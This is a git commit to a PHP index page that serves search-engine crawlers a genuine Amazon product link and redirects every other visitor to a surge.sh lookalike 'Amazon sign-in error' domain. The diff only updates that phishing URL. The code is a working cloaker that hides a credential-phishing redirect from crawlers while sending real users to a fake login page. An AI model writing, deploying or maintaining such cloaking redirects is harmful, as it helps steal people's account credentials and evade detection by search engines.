6c0bf859c6c677cf79093eaac3779ac9d80146f3
snortskob <78163026+snortskob@users.noreply.github.com>
2021-07-10 23:07:39 +0530

    Update index.php

--- index.php
+++ index.php
@@ -5,6 +5,6 @@ if((strstr(strtolower($user_agent), "googlebot")) || (preg_match('/yandex|yahoo|
     header('Location:https://www.amazon.com/Motivational-teamwork-bedroom-office-Aspire/dp/B07CJ2WYCZ');
 }
 else{
-	header('Location:https://amazon-com-signin-issue-error712.surge.sh');
+	header('Location:https://amazon-com-signin-error761.surge.sh');
 }
 ?>
